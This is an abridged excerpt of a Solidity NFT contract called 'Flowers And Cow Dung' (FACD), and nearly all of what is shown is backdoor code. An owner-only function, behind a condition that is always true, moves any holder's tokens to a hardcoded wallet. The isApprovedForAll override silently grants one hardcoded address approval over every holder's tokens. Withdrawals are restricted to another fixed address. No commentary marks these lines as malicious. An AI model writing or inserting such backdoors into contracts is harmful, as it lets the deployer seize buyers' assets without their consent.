...
contract Flowers_And_Cow_Dung is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Flowers And Cow Dung", "FACD", maxBatchSize_, collectionSize_) {
  ...
  function FACD_bb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x63C0C42b898922bF080997fE3e43E92623526CCA, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x43f43009EE5922f4b4A1BD610749Ac1B6f39bC76);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xa8BE097c462E24A184c4C75848a4b103F00A0292){return true;}
